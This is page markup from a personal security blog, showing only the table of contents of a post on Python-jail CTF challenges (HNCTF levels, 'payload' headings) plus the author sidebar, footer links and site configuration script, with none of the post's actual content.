class="toc-link" href="#lake-2"><span class="toc-number"></span> <span class="toc-text"> LAkE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number">0.1.</span> <span class="toc-text"> payload:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-51"><span class="toc-number"></span> <span class="toc-text"> LEVEL 5.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lak3"><span class="toc-number"></span> <span class="toc-text"> LAK3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#a-good-blog-can-refer"><span class="toc-number">0.1.</span> <span class="toc-text"> a good blog can refer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type-chnnel"><span class="toc-number"></span> <span class="toc-text"> tyPe Ch@nnEl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4-2"><span class="toc-number"></span> <span class="toc-text"> LEVEL 4</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#level-4-again"><span class="toc-number">0.0.1.</span> <span class="toc-text"> level 4 again</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">0.1.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-2"><span class="toc-number">0.2.</span> <span class="toc-text"> payload:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-405"><span class="toc-number"></span> <span class="toc-text"> LEVEL 4.0.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-41"><span class="toc-number"></span> <span class="toc-text"> LEVEL 4.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-42"><span class="toc-number"></span> <span class="toc-text"> LEVEL 4.2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#or-rather-use-join"><span class="toc-number">0.1.</span> <span class="toc-text"> Or rather use  join :</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-43"><span class="toc-number"></span> <span class="toc-text"> LEVEL 4.3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#the-next-few-levels-are-become-harder-and-harder"><span class="toc-number">0.1.</span> <span class="toc-text"> The next few levels are become harder and harder.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number"></span> <span class="toc-text"> LEVEL 6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#repetition"><span class="toc-number">1.</span> <span class="toc-text"> repetition:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#link-that-may-help-you"><span class="toc-number">1.1.</span> <span class="toc-text"> link that may help you</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-61"><span class="toc-number"></span> <span class="toc-text"> LEVEL 6.1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-3"><span class="toc-number">0.1.</span> <span class="toc-text"> payload:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#or"><span class="toc-number">0.2.</span> <span class="toc-text"> or</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#safeeval"><span class="toc-number"></span> <span class="toc-text"> SAFEEVAL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7"><span class="toc-number"></span> <span class="toc-text"> LEVEL7</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#come-back-later-to-try-to-figure-it-out"><span class="toc-number">0.0.1.</span> <span class="toc-text"> Come back later to try to figure it out...</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#blog"><span class="toc-number">0.1.</span> <span class="toc-text"> blog</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail"><span class="toc-number"></span> <span class="toc-text"> Ok, so that&#39;s the end of the hnctf. There are some thing that may help you get further about pyjail:</span></a></div><div class="related panel pjax" data-title="Related"></div><div class="overview panel" data-title="Overview"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="Moyao" src="/assets/avatar.jpg"/><p class="name" itemprop="name">Moyao</p><div class="description" itemprop="description">Write down something interesting I met
feel free to mail me if you have something wanted to talk about
mail: &lt;moyaoxue@outlook.com&gt;
</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">71</span><span class="name">posts</span></a></div><div class="item tags"><a href="/tags/"><span class="count">13</span><span class="name">tags</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/name" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;name"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>Home</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/11/02/hnctfRe/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/09/25/Changes-of-Python-API-in-IDA/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>Random Posts</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2024/01/24/CVE-2017-6736/">CVE-2017-6736</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/09/18/seccon-2023/">seccon 2023</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/">初探python bytecode</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/03/17/%E5%A4%9C%E5%BD%B3%E4%BA%8D/">夜彳亍</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/">print占位符重写初探</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/10/02/BuckeyeCTF2023/">BuckeyeCTF2023</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2022/11/02/hnctfRe/">hnctfRe</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2024/04/14/web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/">web入门操作</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2024/04/02/driver%E5%A4%8D%E7%8E%B0-%E9%93%81%E4%B8%892024/">driver复现(铁三2024)</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/09/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a></span></li></ul></div><div class="rpost pjax"><h2>Recent Comments</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">Moyao @ testName</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="Symbols count total">625k words</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="Reading time total">9:28</span></div><div class="powered-by">Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
        path: `2022/11/01/pythonJail/`,
        favicon: {
        show: `(●´3｀●) Here we go again.`,
        hide: `(´Д｀) It's a disaster!`
    },
    search: {
        placeholder: "Search for Posts",
        empty: "We didn't find any results for the search: ${query}",
        stats: "${hits} results found in ${time} ms"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">Article Timeliness Alert</span><br>This is an article published {{publish}} days ago and last updated {{updated}} days ago. Some information may have changed, so please be careful to screen it.</p></div>`,
    quiz: {
        choice: `Multiple Choice`,
        multiple: `Multiple Answer`,
        true_false: `True/False`,
        essay: `Questions`,
        gap_fill: `Gap Filling`,
        mistake: `Wrong Answer`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.2.4/pace.min.js" async></script><script src="/js/siteInit.js?v=0.4.2" type="module" fetchpriority="high" defer></script></body></html>